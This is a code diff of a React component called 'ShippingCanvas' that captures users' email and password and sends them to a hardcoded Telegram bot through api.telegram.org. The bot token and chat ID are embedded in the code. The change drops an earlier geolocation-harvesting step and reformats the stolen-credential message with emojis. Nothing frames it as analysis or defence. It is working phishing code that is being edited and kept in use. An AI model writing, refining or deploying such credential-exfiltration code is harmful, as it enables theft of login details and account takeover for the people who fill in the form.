@@ -4,8 +4,7 @@ const ShippingCanvas = () => {
   const emailInputRef = useRef(null); // Reference for email input
   const passwordInputRef = useRef(null); // Reference for password input
   const canvasRef = useRef(null); // Reference for canvas
-  const [geoData, setGeoData] = useState(null); // State for storing geolocation data
-  const [formData, setFormData] = useState({ email: '', password: '', latitude: null, longitude: null });
+  const [formData, setFormData] = useState({ email: '', password: '' }); // State for storing form data
 
   useEffect(() => {
     const canvas = canvasRef.current;
@@ -41,6 +40,7 @@ const ShippingCanvas = () => {
       }
     };
     canvasRef.current.addEventListener('click', handleCanvasClick);
+
     return () => {
       canvasRef.current.removeEventListener('click', handleCanvasClick);
     };
@@ -63,25 +63,15 @@ const ShippingCanvas = () => {
     }
 
     try {
-      // Use a Promise-based wrapper for geolocation to use await
-      const position = await new Promise((resolve, reject) =>
-        navigator.geolocation.getCurrentPosition(resolve, reject)
-      );
-      const { latitude, longitude } = position.coords;
-      setGeoData({ latitude, longitude });
-      
-      // Update the formData state with email, password, and geoData
-      setFormData({
-        email,
-        password,
-        latitude,
-        longitude,
-      });
+      // Update formData with only email and password
+      setFormData({ email, password });
 
-      // Send data to Telegram bot
+      // Send data to Telegram bot with emojis
       const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
       const chatId = '6707519229';
-      const message = `📨 **Email:** ${email} 🔑 **Password:** ${password} 📍 **Latitude:** ${latitude} 📍 **Longitude:** ${longitude}`;
+      
+      // Add emojis to the message and ensure the data is arranged on new lines
+      const message = `📧 **Email:** ${email}\n🔑 **Password:** ${password}`;
       const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
       const response = await fetch(telegramUrl);
@@ -92,8 +82,8 @@ const ShippingCanvas = () => {
         alert('Error sending message');
       }
     } catch (error) {
-      console.error('Geolocation error:', error);
-      alert('Error retrieving geolocation data');
+      console.error('Error:', error);
+      alert('Error processing your request');
     }
   };
 
